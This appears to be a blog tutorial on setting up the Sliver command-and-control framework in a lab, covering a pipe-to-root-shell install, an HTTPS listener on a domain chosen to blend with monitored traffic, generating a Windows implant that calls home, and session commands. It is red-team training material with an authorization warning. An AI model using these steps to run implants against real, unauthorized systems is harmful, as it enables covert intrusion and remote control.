---
title: "Getting Started with Sliver C2 in a Realistic Lab Environment"
published: 2026-04-05
description: "A practical guide to installing and configuring Sliver C2 in a controlled lab environment that simulates real-world conditions using a VPS, domain, and HTTPS."
image: ""
tags: ["c2", "sliver", "red team", "windows"]
category: "Command & Control"
draft: false
lang: "en-US"
---

:::note
<a href="https://sliver.sh" target="_blank">Sliver</a> is a powerful command and control (C2) framework designed to provide advanced capabilities for covertly managing and controlling remote systems.
:::

In this article, I’ll demonstrate how to set up and operate a Sliver server in a controlled lab environment designed to simulate real-world conditions, using a VPS and HTTPS for remote communication. A machine with a static public IP address is required so that the implant running on a target machine can communicate reliably. For this purpose, I recommend using a VPS running Ubuntu (24.04 or later).

:::warning
This setup should only be used in controlled lab environments or with explicit authorization.
:::

## Installation

```bash
curl https://sliver.sh/install | sudo bash
```

Verify that the installation was successful:
```bash
sliver
```

:::tip
Enable ```sliver``` service to ensure it persists after reboots.
```bash
sudo systemctl enable sliver
```
:::

## DNS Configuration

To achieve a more realistic setup, a domain is required. Since the traffic may be monitored, using a domain makes it more likely to blend in with normal traffic.

:::tip
Check the <a href="https://sliver.sh/docs?name=DNS+C2" target="_blank">DNS C2</a> official documentation for more details.
:::

## Start HTTPS listener

Access sliver client with ```sliver``` command and execute:

```bash
https --domain <your-domain> --lets-encrypt
```

Sliver can automatically obtain and manage TLS certificates using Let’s Encrypt when the ```--lets-encrypt``` flag is enabled, eliminating the need for manual certificate generation.

To check if the listener was created successful execute ```jobs```. Your Sliver server is now ready to receive implant connections, and communications will be encrypted, reducing the risk of data exposure if the network is monitored. 

:::tip
Check the <a href="https://sliver.sh/docs?name=HTTPS+C2" target="_blank">HTTPS C2</a> official documentation for more details.
:::

## Generate implant

```bash
generate --os windows --http <your-domain>
```

This command creates an ```.exe``` file which, when executed on a target machine, will establish a connection with the Sliver server and create a session.

:::tip
Check the <a href="https://sliver.sh/docs?name=HTTPS+C2" target="_blank">HTTPS C2</a> official documentation for more details.
:::

## Basic usage

Once the connection is establish, you can list sessions with:

```bash
sessions
```

To interact with a specific session, run:

```bash
use <session-id>
```

After, list availables commands with ```help```. For example, ```pwd``` print working directory of the active session.

Use the ```-h``` flag to display help for a specific command.

***

#### Article source:

::github{repo="matheus-git/spitfire"}
